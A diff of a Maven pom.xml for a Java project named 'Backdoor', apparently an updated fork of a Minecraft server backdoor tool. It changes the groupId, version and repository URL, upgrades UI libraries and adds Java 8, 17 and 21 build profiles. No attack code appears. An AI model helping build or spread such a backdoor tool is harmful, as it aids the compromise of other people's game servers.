@@ -4,9 +4,9 @@
          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
     <modelVersion>4.0.0</modelVersion>
 
-    <groupId>com.thiccindustries.backdoor</groupId>
+    <groupId>com.zeroedindustries.backdoor</groupId>
     <artifactId>backdoor</artifactId>
-    <version>3.2</version>
+    <version>3.6.1</version>
     <packaging>jar</packaging>
 
     <name>Backdoor</name>
@@ -17,7 +17,7 @@
         <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
         <javaassist.version>3.21.0-GA</javaassist.version>
     </properties>
-    <url>https://github.com/ThiccIndustries/Minecraft-Backdoor</url>
+    <url>https://github.com/ProgMEM-CC/Minecraft-Backdoor-Updated</url>
 
     <build>
         <plugins>
@@ -120,7 +120,43 @@
         <dependency>
             <groupId>com.formdev</groupId>
             <artifactId>flatlaf</artifactId>
-            <version>1.6.5</version>
+            <version>3.6</version>
+        </dependency>
+        <dependency>
+            <groupId>com.formdev</groupId>
+            <artifactId>flatlaf-intellij-themes</artifactId>
+            <version>3.6</version>
         </dependency>
     </dependencies>
+    <profiles>
+        <profile>
+            <id>java8</id>
+            <properties>
+                <java.version>1.8</java.version>
+            </properties>
+            <build>
+                <finalName>${project.artifactId}-java8</finalName>
+            </build>
+        </profile>
+
+        <profile>
+            <id>java17</id>
+            <properties>
+                <java.version>17.0.13</java.version>
+            </properties>
+            <build>
+                <finalName>${project.artifactId}-java17</finalName>
+            </build>
+        </profile>
+
+        <profile>
+            <id>java21</id>
+            <properties>
+                <java.version>21.0.3</java.version>
+            </properties>
+            <build>
+                <finalName>${project.artifactId}-java21</finalName>
+            </build>
+        </profile>
+    </profiles>
 </project>
